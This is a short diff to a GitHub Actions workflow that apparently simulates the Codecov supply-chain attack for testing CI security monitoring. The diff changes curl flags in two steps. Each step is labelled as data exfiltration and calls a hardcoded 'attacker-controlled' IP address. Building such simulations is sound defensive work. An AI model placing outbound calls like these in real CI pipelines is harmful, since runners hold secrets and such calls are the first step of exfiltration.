@@ -10,7 +10,7 @@ jobs:
 
       # Codecov Scenario: Exfiltrate data to attacker's IP address
       - name: Data Exfiltration To Attacker Controlled IP address
-        run: curl 104.16.209.12 -L
+        run: curl 104.16.209.12 --connect-timeout 5
   direct-ip-arc:
     runs-on: self-hosted
     steps:
@@ -18,4 +18,4 @@ jobs:
 
       # Codecov Scenario: Exfiltrate data to attacker's IP address
       - name: Data Exfiltration To Attacker Controlled IP address
-        run: curl 104.16.209.12 -L
+        run: curl 104.16.209.12 --connect-timeout 5
